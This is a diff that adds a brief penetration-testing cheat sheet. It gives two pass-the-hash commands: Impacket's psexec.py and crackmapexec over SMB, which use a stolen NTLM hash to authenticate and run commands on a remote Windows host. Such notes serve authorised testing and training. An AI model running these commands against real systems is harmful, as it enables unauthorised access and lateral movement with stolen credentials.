@@ -1,0 +1,7 @@
+# Psexec.py
+
+python psexec.py -hashes 00000000000000000000000000000000:<NTLM-HASH> USERNAME@<SERVER-IP>
+
+# Crackmap exec
+
+crackmapexec smb 192.168.1.105 -u <USERNAME> -H <NTLM-HASH> -x whoami
